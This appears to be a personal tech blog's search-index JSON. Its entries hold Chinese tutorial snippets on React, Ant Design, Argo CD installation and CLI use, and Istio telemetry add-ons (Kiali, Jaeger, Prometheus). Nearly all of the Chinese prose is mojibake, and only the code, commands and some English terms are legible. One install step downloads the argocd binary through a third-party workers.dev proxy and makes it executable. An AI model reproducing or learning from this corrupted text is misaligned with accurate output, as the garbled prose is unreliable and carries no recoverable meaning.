è·¯ç”±å‘ˆç°æ–¹å¼ã€‚å‰è€…æ˜¯xxx/xxx/xxx,åè€…æ˜¯/#/ Switch ä½¿ç”¨è¿™ä¸ªç»„ä»¶åï¼Œä»…åŒ¹é…ç¬¬ä¸€ä¸ªè·¯ç”± Route - exact/path/component åŒ¹é…è·¯ç”±çš„æ¨¡å¼ Link/NavLink å®ç°è·¯ç”±è·³è½¬çš„ç»„ä»¶ ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ åŠ¨æ€è·¯ç”±é…ç½® /detail/2021 Redirect/404 JS ","date":"2021-10-06 21:26","objectID":"/post/2705/:0:0","tags":[],"title":"Reactå…¥é—¨å­¦ä¹ -React-Router(å››)","uri":"/post/2705/"},{"categories":["å‰ç«¯"],"content":"æœ¬æ–‡æ¥ç€ä½¿ç”¨ä¸Šä¸€ç¯‡çš„é¡¹ç›®ä»£ç  ","date":"2021-10-06 20:43","objectID":"/post/2704/:0:0","tags":["antd pro","react","antd"],"title":"Reactå…¥é—¨å­¦ä¹ -Ant Design(ä¸‰)","uri":"/post/2704/"},{"categories":["å‰ç«¯"],"content":"å®‰è£…Antd yarn add antd ","date":"2021-10-06 20:43","objectID":"/post/2704/:0:1","tags":["antd pro","react","antd"],"title":"Reactå…¥é—¨å­¦ä¹ -Ant Design(ä¸‰)","uri":"/post/2704/"},{"categories":["å‰ç«¯"],"content":"ä½¿ç”¨antdç»„ä»¶ ä¿®æ”¹src/App.js // æ·»åŠ å¦‚ä¸‹ä¸¤è¡Œå¼•å…¥antdç»„ä»¶ import { Input, Button } from \"antd\" import 'antd/dist/antd.css' // ä¿®æ”¹ä¹‹å‰çš„inputå’Œbutton \u003cInput type=\"text\" style={{width: 200}} value={val} onChange={this.handleChange} /\u003e \u003cButton type=\"primary\" onClick={this.handleAdd}\u003eæ·»åŠ \u003c/Button\u003e ","date":"2021-10-06 20:43","objectID":"/post/2704/:0:2","tags":["antd pro","react","antd"],"title":"Reactå…¥é—¨å­¦ä¹ -Ant Design(ä¸‰)","uri":"/post/2704/"},{"categories":["å‰ç«¯"],"content":"ä½¿ç”¨searchç»„ä»¶å®ç°æ·»åŠ  1.å®šä¹‰searchç»„ä»¶ const Search = Input.Search 2.ä½¿ç”¨Searchç»„ä»¶ï¼Œæœ€ç»ˆä»£ç å¦‚ä¸‹ // import './App.css'; import React from \"react\"; import { Input, Button } from \"antd\" import 'antd/dist/antd.css' const Search = Input.Search class App extends React.Component{ state = { val: '', li: [] } handleChange = (event) =\u003e { this.setState({ val: event.target.value }) } handleAdd = () =\u003e { const { val, li } = this.state li.push(val) this.setState({ li }) console.log(this.state) } handleSearch = (value) =\u003e { const { li } = this.state li.push(value) this.setState({ li }) } render(){ const { val, li } = this.state return \u003cdiv\u003e \u003cInput type=\"text\" style={{width: 200}} value={val} onChange={this.handleChange} /\u003e \u003cButton type=\"primary\" onClick={this.handleAdd}\u003eæ·»åŠ \u003c/Button\u003e \u003cSearch placeholder=\"input search text\" allowClear enterButton=\"æ·»åŠ \" size=\"middle\" style={{width: 270}} onSearch={this.handleSearch} /\u003e \u003cul\u003e { li.map((item, index)=\u003e{ return \u003cli key={index}\u003e{item}\u003c/li\u003e }) } \u003c/ul\u003e \u003c/div\u003e } } export default App; ","date":"2021-10-06 20:43","objectID":"/post/2704/:0:3","tags":["antd pro","react","antd"],"title":"Reactå…¥é—¨å­¦ä¹ -Ant Design(ä¸‰)","uri":"/post/2704/"},{"categories":["å‰ç«¯"],"content":"ä½¿ç”¨Selectç»„ä»¶ // import './App.css'; import React from \"react\"; import { Input, Button, Select } from \"antd\" import 'antd/dist/antd.css' const Search = Input.Search const Option = Select class App extends React.Component{ state = { val: '', li: [] } handleChange = (event) =\u003e { this.setState({ val: event.target.value }) } handleAdd = () =\u003e { const { val, li } = this.state li.push(val) this.setState({ li }) console.log(this.state) } handleSearch = (value) =\u003e { const { li } = this.state li.push(value) this.setState({ li }) } render(){ const { val, li } = this.state return \u003cdiv\u003e \u003cInput type=\"text\" style={{width: 200}} value={val} onChange={this.handleChange} /\u003e \u003cButton type=\"primary\" onClick={this.handleAdd}\u003eæ·»åŠ \u003c/Button\u003e \u003cSearch placeholder=\"input search text\" allowClear enterButton=\"æ·»åŠ \" size=\"middle\" style={{width: 270}} onSearch={this.handleSearch} /\u003e \u003cSelect defaultValue=\"\" style={{ width: 120 }}\u003e {li.map((item, index)=\u003e{ return \u003cOption value={item} key={index}\u003e{item}\u003c/Option\u003e })} \u003c/Select\u003e \u003cul\u003e { li.map((item, index)=\u003e{ return \u003cli key={index}\u003e{item}\u003c/li\u003e }) } \u003c/ul\u003e \u003c/div\u003e } } export default App; ","date":"2021-10-06 20:43","objectID":"/post/2704/:0:4","tags":["antd pro","react","antd"],"title":"Reactå…¥é—¨å­¦ä¹ -Ant Design(ä¸‰)","uri":"/post/2704/"},{"categories":["å‰ç«¯"],"content":"å®‰è£…åˆ›å»ºè„šæ‰‹æ¶çš„å‘½ä»¤ cnpm install create-react-app -g ","date":"2021-10-06 14:38","objectID":"/post/2703/:0:1","tags":["react","antd"],"title":"Reactå…¥é—¨å­¦ä¹ -è„šæ‰‹æ¶(äºŒ)","uri":"/post/2703/"},{"categories":["å‰ç«¯"],"content":"åˆ›å»ºé¡¹ç›® create-react-app react-learn-1 cd react-learn-1 ","date":"2021-10-06 14:38","objectID":"/post/2703/:0:2","tags":["react","antd"],"title":"Reactå…¥é—¨å­¦ä¹ -è„šæ‰‹æ¶(äºŒ)","uri":"/post/2703/"},{"categories":["å‰ç«¯"],"content":"è¿è¡Œé¡¹ç›® cd react-learn-1 yarn start ","date":"2021-10-06 14:38","objectID":"/post/2703/:0:3","tags":["react","antd"],"title":"Reactå…¥é—¨å­¦ä¹ -è„šæ‰‹æ¶(äºŒ)","uri":"/post/2703/"},{"categories":["å‰ç«¯"],"content":"Todo-demoç¤ºä¾‹ ä¿®æ”¹src/App.js // import './App.css'; import React from \"react\"; class App extends React.Component{ state = { val: '', li: [] } handleChange = (event) =\u003e { this.setState({ val: event.target.value }) } handleAdd = () =\u003e { const { val, li } = this.state li.push(val) this.setState({ li }) console.log(this.state) } render(){ const { val, li } = this.state return \u003cdiv\u003e \u003cinput type=\"text\" value={val} onChange={this.handleChange} /\u003e \u003cbutton onClick={this.handleAdd}\u003eæ·»åŠ \u003c/button\u003e \u003cul\u003e { li.map((item, index)=\u003e{ return \u003cli key={index}\u003e{item}\u003c/li\u003e }) } \u003c/ul\u003e \u003c/div\u003e } } export default App; ","date":"2021-10-06 14:38","objectID":"/post/2703/:0:4","tags":["react","antd"],"title":"Reactå…¥é—¨å­¦ä¹ -è„šæ‰‹æ¶(äºŒ)","uri":"/post/2703/"},{"categories":["å‰ç«¯"],"content":"åŸºæœ¬è¯­æ³• # åˆ›å»ºå…ƒç´ ã€æ ‡ç­¾ React.createElement() # æ¸²æŸ“å…ƒç´ åˆ°æŒ‡å®šçš„ä½ç½® ReactDOM.render() # React.Component ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:1","tags":["react"],"title":"Reactå…¥é—¨å­¦ä¹ -åŸºç¡€(ä¸€)","uri":"/post/2698/"},{"categories":["å‰ç«¯"],"content":"ä¾‹å­ä¸­çš„html \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003cscript src=\"./node_modules/react/umd/react.development.js\"\u003e\u003c/script\u003e \u003cscript src=\"./node_modules/react-dom/umd/react-dom.development.js\"\u003e\u003c/script\u003e \u003cscript src=\"https://unpkg.com/babel-standalone@6.26.0/babel.js\"\u003e\u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"app\"\u003e\u003c/div\u003e \u003cscript type=\"text/babel\"\u003e ä¾‹å­ä¸­çš„ä»£ç åœ¨è¿™é‡Œ \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:2","tags":["react"],"title":"Reactå…¥é—¨å­¦ä¹ -åŸºç¡€(ä¸€)","uri":"/post/2698/"},{"categories":["å‰ç«¯"],"content":"JSX jsä¸­å†™htmlï¼Œhtmlä¸­å†™jsã€‚ ä¾‹å­ # å°†eleå…ƒç´ æ¸²æŸ“åˆ°id=appçš„æ ‡ç­¾ä¸­ã€‚è¿™é‡Œæ²¡æœ‰ä½¿ç”¨React.createElement()ï¼Œè€Œæ˜¯ä½¿ç”¨çš„es6çš„è¯­æ³•ç³– var name = 'soulchild'; var ele = \u003ch1 className=\"myclass\" \u003ehello {name}\u003c/h1\u003e; ReactDOM.render(ele,document.getElementById('app')); ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:3","tags":["react"],"title":"Reactå…¥é—¨å­¦ä¹ -åŸºç¡€(ä¸€)","uri":"/post/2698/"},{"categories":["å‰ç«¯"],"content":"ç»„ä»¶å’Œprops å‡½æ•°å¼ç»„ä»¶(æ— çŠ¶æ€) # å°†å…ƒç´ å†…å®¹å®šä¹‰åœ¨å‡½æ•°ä¸­ï¼Œä½¿ç”¨returnè¿”å›ã€‚å‡½æ•°åå°±æ˜¯ç»„ä»¶åã€‚ function Info(props){ return \u003cdiv\u003e \u003ch1\u003eå§“å: {props.name}\u003c/h1\u003e \u003cp\u003eå¹´é¾„: {props.age}\u003c/p\u003e \u003cp\u003eæ“…é•¿: æ¢¦æ¸¸\u003c/p\u003e \u003c/div\u003e } ReactDOM.render( \u003cInfo name=\"SoulChild\" age=\"18\" /\u003e, document.getElementById('app') ) ç±»ç»„ä»¶(æœ‰çŠ¶æ€) # éœ€è¦ç»§æ‰¿React.Componentï¼Œclassç»„ä»¶è¿˜éœ€è¦render+returnã€‚ # ç±»ç»„ä»¶åœ¨è°ƒç”¨æ—¶ä¼šåˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œç„¶åé€šè¿‡è°ƒç”¨å®ä¾‹é‡Œçš„renderæ–¹æ³•æ¥è·å–å…ƒç´ ã€‚ class InfoPlus extends React.Component{ render(){ return \u003cdiv\u003e \u003ch1\u003eå§“å: {this.props.name}\u003c/h1\u003e \u003cp\u003eå¹´é¾„: {this.props.age}\u003c/p\u003e \u003cp\u003eæ“…é•¿: æ¢¦æ¸¸\u003c/p\u003e \u003c/div\u003e } } ReactDOM.render( \u003cInfoPlus name=\"SoulChild\" age=\"18\" /\u003e, document.getElementById('app') ) ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:4","tags":["react"],"title":"Reactå…¥é—¨å­¦ä¹ -åŸºç¡€(ä¸€)","uri":"/post/2698/"},{"categories":["å‰ç«¯"],"content":"Reactç”Ÿå‘½å‘¨æœŸ 93784-ecbxjjqy50i.png Initialization-ç»„ä»¶åˆå§‹åŒ–é˜¶æ®µ Mounting-ç»„ä»¶åŠ è½½é˜¶æ®µ Updation-æ•°æ®æ›´æ–°é˜¶æ®µ Unmointing-ç»„ä»¶é”€æ¯é˜¶æ®µ class InfoPlus extends React.Component{ // å®šä¹‰é’©å­å‡½æ•° constructor(props){ // åˆå§‹åŒ–props super(props); // åˆå§‹åŒ–state this.state= { name: 'SoulChild', age: '18' } console.log('Initialization-æ•°æ®åˆå§‹åŒ–é˜¶æ®µ') } componentWillMount(){ console.log('Mounting(componentWillMount)-ç»„ä»¶å°†è¦åŠ è½½') } componentDidMount(){ console.log('Mounting(componentDidMount)-ç»„ä»¶å·²åŠ è½½') } componentWillReceiveProps(){ console.log('Updation(componentWillReceiveProps)-ä¸çŸ¥é“') } // æ˜¯å¦å…è®¸æ›´æ–°æ•°æ® shouldComponentUpdate(){ console.log('Updation(shouldComponentUpdate)-è¦æ›´æ–°æ•°æ®å—') return true; // å…è®¸ } componentWillUpdate(){ console.log('Updation(componentWillUpdate)-æ•°æ®å°†è¦æ›´æ–°') } componentDidUpdate(){ console.log('Updation(componentDidUpdate)-æ•°æ®å·²æ›´æ–°') } // è¿™é‡Œä½¿ç”¨çš„ç®­å¤´å‡½æ•°ã€‚ä½¿ç”¨æ™®é€šå‡½æ•°è·å–ä¸åˆ°thisã€‚ updateUser = () =\u003e { this.setState({ name: 'TC', age: '19' }) } render(){ console.log('Mounting or Updation(render)-ç»„ä»¶åŠ è½½æˆ–æ•°æ®æ›´æ–°') return \u003cdiv\u003e \u003ch1\u003eå§“å: {this.state.name}\u003c/h1\u003e \u003cp\u003eå¹´é¾„: {this.state.age}\u003c/p\u003e \u003cp\u003eæ“…é•¿: æ¢¦æ¸¸\u003c/p\u003e \u003cbutton onClick={this.updateUser}\u003eæ›´æ–°æ•°æ®\u003c/button\u003e \u003c/div\u003e } } ReactDOM.render( \u003cInfoPlus /\u003e, document.getElementById('app') ) ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:5","tags":["react"],"title":"Reactå…¥é—¨å­¦ä¹ -åŸºç¡€(ä¸€)","uri":"/post/2698/"},{"categories":["å‰ç«¯"],"content":"è¡¨å•ã€TODOåº”ç”¨ class List extends React.Component{ constructor(props){ # ä½¿ç”¨stateä¹‹å‰å¿…é¡»å…ˆèµ°è¿™ä¸ª super(props) # å®šä¹‰ä¸¤ä¸ªç©ºå€¼ this.state = { val: '', // ä½œä¸ºä¸´æ—¶å­˜å‚¨ï¼Œæ¯æ¬¡è¾“å…¥å†…å®¹åéƒ½ä¼šè¢«æ›¿æ¢ list: [] // ä¸€ä¸ªåˆ—è¡¨ï¼Œå­˜å‚¨æ‰€æœ‰æ·»åŠ è¿›æ¥çš„å†…å®¹ } } // å°†inputæ¡†è¾“å…¥çš„å†…å®¹æš‚å­˜åˆ°state.valä¸­ handleInput = (event) =\u003e { this.setState({ val: event.target.value }) } // è¯»å–valçš„å†…å®¹å°†å…¶æ·»åŠ åˆ°state.listä¸­ handleAdd = () =\u003e { const { val, list } = this.state list.push(val) // è¦æƒ³æ”¹å˜æ•°æ®æ—¶åŒæ­¥æ›´æ–°åˆ°é¡µé¢ä¸­ï¼Œå¿…é¡»ä½¿ç”¨setState this.setState({ list: list }) } render(){ const val = this.state.val const arr = this.state.list let itemList = [] // å­˜æ”¾æ‰€æœ‰liæ ‡ç­¾å…ƒç´  // é€šè¿‡å¾ªç¯å‡ºstate.listä¸­çš„å€¼,ç”Ÿæˆliæ ‡ç­¾,æœ€åpushåˆ°itemList arr.map((item,index)=\u003e{ let li = \u003cli key={index}\u003e{item}\u003c/li\u003e itemList.push(li) }) return \u003cdiv\u003e \u003cdiv\u003e \u003cinput type=\"text\" value={val} onChange={this.handleInput} /\u003e \u003cbutton onClick={this.handleAdd}\u003eæ·»åŠ \u003c/button\u003e \u003c/div\u003e \u003cul\u003e {itemList} \u003c/ul\u003e \u003c/div\u003e } } ReactDOM.render(\u003cList /\u003e, document.getElementById('app')) ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:6","tags":["react"],"title":"Reactå…¥é—¨å­¦ä¹ -åŸºç¡€(ä¸€)","uri":"/post/2698/"},{"categories":["kubernetes","devops"],"content":"https://argo-cd.readthedocs.io/en/stable/operator-manual/webhook/ ","date":"2021-09-29 11:34","objectID":"/post/2694/:0:0","tags":["k8s","devops","cd","argocd"],"title":"argocd-æ¨æ¨¡å¼é…ç½®","uri":"/post/2694/"},{"categories":["kubernetes","devops"],"content":"å‚è€ƒ: https://argoproj.github.io/argo-cd/operator-manual/health/#custom-health-checks k edit cm -n argocd argocd-cm data: resource.customizations.health.extensions_Ingress: | hs = {} hs.status = \"Healthy\" hs.message = \"SoulChild\" return hs resource.customizations.useOpenLibs.extensions_Ingress: \"true\" åˆ é™¤pod(æ²¡è¯•è¿‡ä¸åˆ è¡Œä¸è¡Œ)ï¼Œç„¶åargocdé‡æ–°syncã€‚ k delete pod -n argocd argocd-application-controller-0 ","date":"2021-09-28 14:43","objectID":"/post/2687/:0:0","tags":["k8s","devops","argocd"],"title":"è§£å†³argocd ingressèµ„æºçŠ¶æ€ä¸€ç›´Progressing","uri":"/post/2687/"},{"categories":["kubernetes","devops"],"content":"ä¸€ã€å®‰è£… ","date":"2021-09-27 17:15","objectID":"/post/2682/:1:0","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"1.å®‰è£…argocd kubectl create namespace argocd kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml å¦‚æœä½¿ç”¨å…¶ä»–å‘½åç©ºé—´,éœ€è¦æ‰‹åŠ¨ä¿®æ”¹ClusterRoleBindingå¼•ç”¨çš„ServiceAccountæ‰€åœ¨çš„namespace ","date":"2021-09-27 17:15","objectID":"/post/2682/:1:1","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"2.æš´éœ²argocd ui # NodePortæ–¹å¼ kubectl patch service -n argocd argocd-server -p '{\"spec\": {\"type\": \"NodePort\"}}' ","date":"2021-09-27 17:15","objectID":"/post/2682/:1:2","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.ç™»é™†argocd # è·å–adminç™»é™†å¯†ç  kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath=\"{.data.password}\" | base64 -d ","date":"2021-09-27 17:15","objectID":"/post/2682/:1:3","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"4.å®‰è£…cli # linux wget -O /usr/local/bin/argocd https://github.91chifun.workers.dev/https://github.com//argoproj/argo-cd/releases/download/v2.1.2/argocd-linux-amd64 \u0026\u0026 chmod +x /usr/local/bin/argocd # mac sudo wget -O /usr/local/bin/argocd https://github.91chifun.workers.dev/https://github.com//argoproj/argo-cd/releases/download/v2.1.2/argocd-darwin-amd64 \u0026\u0026 sudo chmod +x /usr/local/bin/argocd ","date":"2021-09-27 17:15","objectID":"/post/2682/:1:4","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"äºŒã€ç®€å•ä½¿ç”¨ ","date":"2021-09-27 17:15","objectID":"/post/2682/:2:0","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"1.å‡†å¤‡gitä»“åº“ ç›®å½•ç»“æ„ $ tree . . â”œâ”€â”€ README.md â””â”€â”€ web-server-headers â”œâ”€â”€ deploy.yaml â”œâ”€â”€ ingress.yaml â””â”€â”€ svc.yaml deploy.yamlæ˜¯éƒ¨ç½²æ–‡ä»¶ ","date":"2021-09-27 17:15","objectID":"/post/2682/:2:1","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"2.é…ç½®argocdä»“åº“ 53645-7p12nzzzj1q.png 44264-8p8dcz4gba.png ","date":"2021-09-27 17:15","objectID":"/post/2682/:2:2","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.åˆ›å»ºåº”ç”¨ 08298-w403pblpvnd.png ","date":"2021-09-27 17:15","objectID":"/post/2682/:2:3","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"4.æŸ¥çœ‹ç»“æœ 74565-97zgp2ps7j.png ","date":"2021-09-27 17:15","objectID":"/post/2682/:2:4","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"ä¸‰ã€cliä½¿ç”¨ ","date":"2021-09-27 17:15","objectID":"/post/2682/:3:0","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.1 å¿«é€Ÿå…¥é—¨æ“ä½œ 1.ç™»é™† argocd login ArgoCD_Address:Port 37459-3hgps5l2tl4.png 2.ä¿®æ”¹å¯†ç  argocd account update-password 3.ä»gitä»“åº“åˆ›å»ºä¸€ä¸ªApplication argocd app create guestbook --repo https://github.com/argoproj/argocd-example-apps.git --path guestbook --dest-server https://kubernetes.default.svc --dest-namespace default åˆ›å»ºä¸€ä¸ªguestbook app,æŒ‡å®šä»“åº“åœ°å€ã€åº”ç”¨è·¯å¾„ã€ç›®æ ‡apiserveråœ°å€ã€ç›®æ ‡namespace 4.åˆ—å‡ºæ‰€æœ‰appå’ŒæŒ‡å®šapp argocd app list argocd app get guestbook 5.æ‰‹åŠ¨ä»gitä»“åº“åŒæ­¥æŒ‡å®šapp argocd app sync guestbook 72158-qlb856vuy8.png ","date":"2021-09-27 17:15","objectID":"/post/2682/:3:1","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.2 ç®¡ç†é¡¹ç›® åˆ›å»ºé¡¹ç›® argocd proj create myproject -d https://kubernetes.default.svc,mynamespace -s https://github.com/argoproj/argocd-example-apps.git -d: è¯¥é¡¹ç›®å…è®¸ä½¿ç”¨çš„apiserverå’Œnamespace -s: å…è®¸ä½¿ç”¨çš„gitä»“åº“ æŸ¥çœ‹é¡¹ç›®åˆ—è¡¨: argocd proj list æ·»åŠ é¡¹ç›®å¯ä½¿ç”¨çš„gitä»“åº“: argocd proj add-source \u003cPROJECT\u003e \u003cREPO\u003e åˆ é™¤é¡¹ç›®å¯ä½¿ç”¨çš„gitä»“åº“: argocd proj remove-source \u003cPROJECT\u003e \u003cREPO\u003e é™åˆ¶é¡¹ç›®å¯ä½¿ç”¨çš„k8sèµ„æº(clusterçº§åˆ«èµ„æºé»˜è®¤æ‹’ç»,namespaceçº§åˆ«é»˜è®¤å…è®¸): # å…è®¸ä½¿ç”¨ä»€ä¹ˆæ ·çš„èµ„æº argocd proj allow-cluster-resource \u003cPROJECT\u003e \u003cGROUP\u003e \u003cKIND\u003e argocd proj allow-namespace-resource \u003cPROJECT\u003e \u003cGROUP\u003e \u003cKIND\u003e # æ‹’ç»ä½¿ç”¨ä»€ä¹ˆæ ·çš„èµ„æº argocd proj deny-cluster-resource \u003cPROJECT\u003e \u003cGROUP\u003e \u003cKIND\u003e argocd proj deny-namespace-resource \u003cPROJECT\u003e \u003cGROUP\u003e \u003cKIND\u003e Applicationåˆ†é…ç»™é¡¹ç›®: argocd app set guestbook-default --project myproject è·å–é¡¹ç›®ä¿¡æ¯: argocd proj get myproject ç¼–è¾‘é¡¹ç›®yaml: argocd proj edit myproject ","date":"2021-09-27 17:15","objectID":"/post/2682/:3:2","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.3 ç®¡ç†APP æŸ¥çœ‹APPåˆ—è¡¨: argocd app list|get|delete|create -p: æ ¹æ®é¡¹ç›®è¿‡æ»¤ -l: æ ¹æ®æ ‡ç­¾è¿‡æ»¤ -r: æ ¹æ®ä»“åº“è¿‡æ»¤ -o: è¾“å‡ºæ ¼å¼ã€‚wide|name|json|yaml æ‰‹åŠ¨åŒæ­¥: argocd app sync \u003cAPPNAME\u003e ","date":"2021-09-27 17:15","objectID":"/post/2682/:3:3","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.4 è‡ªåŠ¨åŒæ­¥ç›¸å…³ å¼€å¯è‡ªåŠ¨åŒæ­¥: argocd app set \u003cAPPNAME\u003e --sync-policy auto å…³é—­è‡ªåŠ¨åŒæ­¥: argocd app set \u003cAPPNAME\u003e --sync-policy none è‡ªåŠ¨åŒæ­¥æ—¶,è‡ªåŠ¨åˆ é™¤gitä¸­ä¸å­˜åœ¨çš„èµ„æº: argocd app set \u003cAPPNAME\u003e --auto-prune=true æ˜¯å¦å…è®¸ä¸€ä¸ªapplicationæœ‰0ä¸ªèµ„æº: argocd app set \u003cAPPNAME\u003e --allow-empty=true æ—¶åˆ»ä¿è¯ä¸gitä¸­å®šä¹‰çš„çŠ¶æ€åŒæ­¥: argocd app set \u003cAPPNAME\u003e --self-heal=true è‡ªåŠ¨åŒæ­¥ä¼šå°†æ‰€æœ‰å¯¹è±¡éƒ½åŒæ­¥,å¯¹apiserverå¯èƒ½ä¼šé€ æˆæ›´å¤§çš„å‹åŠ›,å¯ä»¥åªåŒæ­¥out-of-syncçŠ¶æ€çš„èµ„æº: argocd app set \u003cAPPNAME\u003e --sync-option ApplyOutOfSyncOnly=true ** æ‰§è¡Œè‡ªåŠ¨åŒæ­¥çš„è¦æ±‚ ** ä»…å½“Applicationä¸º OutOfSync æ—¶æ‰ä¼šæ‰§è¡Œè‡ªåŠ¨åŒæ­¥ã€‚ åŒä¸€ä¸ªcommit idåªä¼šåŒæ­¥ä¸€æ¬¡ï¼Œä¸ç®¡æˆåŠŸè¿˜æ˜¯å¤±è´¥ argocdæ¯ä¸‰åˆ†é’Ÿä¼šæ£€æµ‹gitä»“åº“ä¸€æ¬¡,ç”¨äºåˆ¤æ–­appä¸gitä¸­æè¿°çš„çŠ¶æ€æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´çŠ¶æ€ä¸ºOutOfSyncã€‚(æ³¨æ„è¿™é‡Œå¹¶ä¸ä¼šè§¦å‘æ›´æ–°ï¼Œé™¤éé…ç½®äº†è‡ªåŠ¨åŒæ­¥) ","date":"2021-09-27 17:15","objectID":"/post/2682/:3:4","tags":["k8s","devops","gitops","cd"],"title":"argocdå®‰è£…åŠå…¥é—¨ä½¿ç”¨","uri":"/post/2682/"},{"categories":["kubernetes","Istio"],"content":"éƒ¨ç½²jaeger 1.å®‰è£… k apply -f https://raw.githubusercontent.com/istio/istio/release-1.9/samples/addons/jaeger.yaml ","date":"2021-09-26 14:42","objectID":"/post/2678/:0:1","tags":["k8s","istio","kiali","jaeger"],"title":"Istio-é›†æˆé¥æµ‹æ’ä»¶kialiã€jaegerã€prometheus","uri":"/post/2678/"},{"categories":["kubernetes","Istio"],"content":"éƒ¨ç½²kiali 1.å®‰è£… k apply -f https://raw.githubusercontent.com/istio/istio/release-1.9/samples/addons/kiali.yaml ç”±äºéƒ¨ç½²é¡ºåºé—®é¢˜ï¼Œå¯èƒ½ä¼šå¯¼è‡´åˆ›å»ºå¤±è´¥ï¼Œå†è¿è¡Œä¸€æ¬¡ä¸Šé¢å‘½ä»¤å³å¯ã€‚ 2.æ£€æŸ¥éƒ¨ç½²çŠ¶æ€ k rollout status deployment/kiali -n istio-system 3.æ¥å…¥prometheusã€grafanaã€jaeger ä¿®æ”¹configmap k edit -n istio-system cm kiali å†…å®¹å¦‚ä¸‹: external_services: custom_dashboards: enabled: true prometheus: url: http://prometheus-k8s.monitoring:9090 grafana: enabled: true in_cluster_url: \"http://grafana.monitoring:3000\" url: \"http://192.168.2.10:30462\" tracing: enabled: true in_cluster_url: \"http://tracing.istio-system/jaeger\" url: \"http://192.168.2.10:32344/jaeger\" 4.é‡å¯pod k rollout -n istio-system restart deployment kiali ","date":"2021-09-26 14:42","objectID":"/post/2678/:0:2","tags":["k8s","istio","kiali","jaeger"],"title":"Istio-é›†æˆé¥æµ‹æ’ä»¶kialiã€jaegerã€prometheus","uri":"/post/2678/"},{"categories":["kubernetes","Istio"],"content":"grafana-istioä»ªè¡¨ç›˜ Istio Control Plane Dashboard: 7645 Istio Mesh Dashboard: 7639 Istio Performance Dashboard: 12153 Istio Service Dashboard: 7636 Istio Wasa Extension Dashboard: 13277 Istio Workload Dashboard: 7630 ","date":"2021-09-26 14:42","objectID":"/post/2678/:0:3","tags":["k8s","istio","kiali","jaeger"],"title":"Istio-é›†æˆé¥æµ‹æ’ä»¶kialiã€jaegerã€prometheus","uri":"/post/2678/"},{"categories":["å‰ç«¯"],"content":"antdå°å¸®æ‰‹ ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:0","tags":["antd pro","react"],"title":"Antd Proé€ŸæŸ¥","uri":"/post/2675/"},{"categories":["å‰ç«¯"],"content":"æŸ¥æ‰¾icon iconåœ°å€: https://ant.design/components/icon-cn/ èœå•iconä½¿ç”¨æ–¹æ³•: ç‚¹å‡»å›¾æ ‡å¤åˆ¶ç»„ä»¶åç§°, ç²˜è´´åˆ°route.tsçš„iconä¸­ã€‚å°–æ‹¬å·éœ€è¦å»é™¤,åªä¿ç•™åç§°ã€‚ https://pro.ant.design/zh-CN/docs/new-page#%E5%9C%A8%E8%8F%9C%E5%8D%95%E4%B8%AD%E4%BD%BF%E7%94%A8-iconfont ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:1","tags":["antd pro","react"],"title":"Antd Proé€ŸæŸ¥","uri":"/post/2675/"},{"categories":["å‰ç«¯"],"content":"ä¸»é…è‰² config/defaultSettings.tsæ–‡ä»¶çš„primaryColorå‚æ•° ç»¿è‰²: 